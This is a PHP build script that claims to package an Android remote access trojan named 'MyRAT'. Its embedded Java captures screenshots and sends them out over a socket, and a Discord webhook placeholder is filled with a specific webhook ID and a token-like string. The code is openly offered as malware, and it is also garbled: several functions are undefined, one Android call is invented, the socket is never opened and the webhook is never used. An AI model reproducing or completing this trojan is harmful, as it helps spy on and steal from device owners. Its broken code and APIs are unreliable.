<?php
$apk_name = 'MyRAT.apk';
$icon_name = 'Logo.png';
$manifest = <<<'MANIFEST'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <application android:allowBackup="true" android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:name=".RemoteActivity" android:launchMode="singleTask">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="myapp" />
            </intent-filter>
        </activity>
        <service android:name=".ConnectionService" android:enabled="true" android:exported="false">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="net.myrat" />
            </intent-filter>
        </service>
    </application>
</manifest>
MANIFEST;

$xml = simplexml_load_string($manifest);
$xml->application['android:icon']->addAttribute('@drawable', 'icon');

$webhook_url = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';  // Replace this with your Discord webhook URL

$code = <<<'CODE'
import android.app.Activity;
import android.content.Intent;
import android.content.ServiceConnection;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.IBinder;
import android.provider.MediaStore;
import android.support.v4.content.FileProvider;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class RemoteActivity extends Activity {
    private Button connectButton;
    private ServiceConnection connection;
    private ConnectionService connectionService;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        connectButton = findViewById(R.id.connect_button);
        connectButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                connectToServer();
            }
        });
    }

    private void connectToServer() {
        Intent intent = new Intent();
        intent.setAction("android.intent.action.VIEW");
        intent.addCategory("android.intent.category.BROWSABLE");
        intent.setData(Uri.parse("net.myrat://connect"));
        startActivity(intent);
    }

    @Override
    protected void onStart() {
        super.onStart();
        if (connectionService != null) {
            bindService(new Intent(this, ConnectionService.class), connection, BIND_AUTO_CREATE);
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
        if (connection != null) {
            unbindService(connection);
            connectionService = null;
        }
    }

    public void sendScreenshot(String base64Screenshot) {
        try {
            Bitmap bitmap = BitmapFactory.decodeByteArray(Base64.decode(base64Screenshot, Base64.DEFAULT), 0, base64Screenshot.length());
            MediaStore.Images.Media.insertImage(getContentResolver(), bitmap, "Screenshot", null);
            String path = Images. Media.getRealPathFromURI(getContentResolver(), Uri.parse(MediaStore.Images.Media.EXTERNAL_CONTENT_URI + "/last"));

            Intent intent = new Intent(this, ConnectionService.class);
            intent.putExtra("screenshot", path);
            startService(intent);
        } catch (Exception e) {
            Toast.makeText(this, "Error sending screenshot", Toast.LENGTH_LONG).show();
        }
    }
}

public class ConnectionService extends Service {
    private Socket socket = null;
    private static final String TAG = "RAT";

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("screenshot")) {
            String path = intent.getStringExtra("screenshot");
            try {
                Bitmap bitmap = BitmapFactory.decodeFile(path);
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos);
                String base64Screenshot = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);

                sendMessage(base64Screenshot);
            } catch (Exception e) {
                Log.e(TAG, "Error taking screenshot", e);
            }
        }
        return START_NOT_STICKY;
    }

    public void sendMessage(String message) {
        if (socket != null) {
            try {
                DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
                dos.writeUTF(message);
                dos.flush();
            } catch (Exception e) {
                Log.e(TAG, "Message sending failed", e);
                stopSelf();
            }
        }
    }

    @Override
    public void onDestroy() {
        if (socket != null) {
            try {
                socket.close();
                Log.d(TAG, "Socket closed");
            } catch (IOException e) {
                Log.e(TAG, "Could not close socket", e);
            }
        }
        super.onDestroy();
    }

    public void connectToServer() {
        Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setCancelable(false);
        dialog.setOnCancelListener(new DialogInterface.OnCancelListener() {
            @Override
            public void onCancel(DialogInterface dialogInterface) {
                finish();
            }
        });
        dialog.setContentView(R.layout.dialog_input);
        EditText etIP = dialog.findViewById(R.id.ip_edittext);
        Button btnConnect = dialog.findViewById(R.id.connect_button);

        btnConnect.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String ip = etIP.getText().toString();
                if (ip.matches("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:")) {
                    Intent intent = new Intent();
                    intent.setAction("android.intent.action.VIEW");
                    intent.addCategory("android.intent.category.DEFAULT");
                    intent.addCategory("android.intent.category.BROWSABLE");
                    intent.setData(Uri.parse("net.myrat://" + ip));
                    startActivity(intent);
                    dialog.cancel();
                } else {
                    Toast.makeText(getBaseContext(), "Invalid IP address", Toast.LENGTH_LONG).show();
                }
            }
        });
        dialog.show();
    }
}
CODE;

$layout_activity_main = <<<'LAYOUT'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical">
    <Button
        android:id="@+id/connect_button"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Connect to Server" />
</LinearLayout>
LAYOUT;

$layout_dialog_input = <<<'DIALOG'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical">
    <EditText
        android:id="@+id/ip_edittext"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:ems="10"
        android:inputType="integer"
        android:hint="IP Address" />
    <Button
        android:id="@+id/connect_button"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Connect" />
</LinearLayout>
DIALOG;

$res_values = <<<'VALUES'
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">My RAT</string>
</resources>
VALUES;

$aapt = find_command('aapt');
$DEX = "$apk_name.dex";
$MANIFEST = "$apk_name-manifest.xml";
$RESOURCES = "$apk_name-resources.arsc";
$RES_VALUES = "$apk_name-values.xml";
$APK_tools = "/usr/bin/apktool";
$DX = "/usr/bin/dx";

exec("$aapt d badging $apk_name");
exec("$aapt r $apk_name > $RESOURCES");
exec("iconv -f UTF-8 -t ISO-8859-1 $RES_VALUES -o $RES_VALUES.tmp");
exec("$APK_tools d $apk_name -o $apk_name-decompiled");

uncomment_xml($MANIFEST);
uncomment_xml($RES_VALUES);
replace_string_in_xml($MANIFEST, 'net.myrat', 'direct://rat');
replace_string_in_xml($MANIFEST, '@string/app_name', 'My RAT');
replace_string_in_xml($layout_activity_main, 'Connect to Server', 'Connect');
replace_string_in_xml($code, 'My RAT', 'myApp');
replace_string_in_xml($code, 'net.myrat', 'direct://rat');
replace_string_in_xml($code, 'YOUR_WEBHOOK_ID', '1247949583720648868');
replace_string_in_xml($code, 'YOUR_WEBHOOK_TOKEN', 'MTI0Nzk0OTU4MzcyMDY0ODg2OA.GFlfBo.LpCoW1lYQMqGi7J3Irfzh65iBKbPhPZfU0R5w4');

file_put_contents($MANIFEST, $xml->asXML());
file_put_contents("app/src/main/res/layout/activity_main.xml", $layout_activity_main);
file_put_contents("app/src/main/java/com/example/MyRAT/RemoteActivity.java", $code);

exec("$APK_tools b $apk_name-decompiled -o $apk_name --auto-add-parser=icon.png -i $icon_name");
echo "APK created: $apk_name";
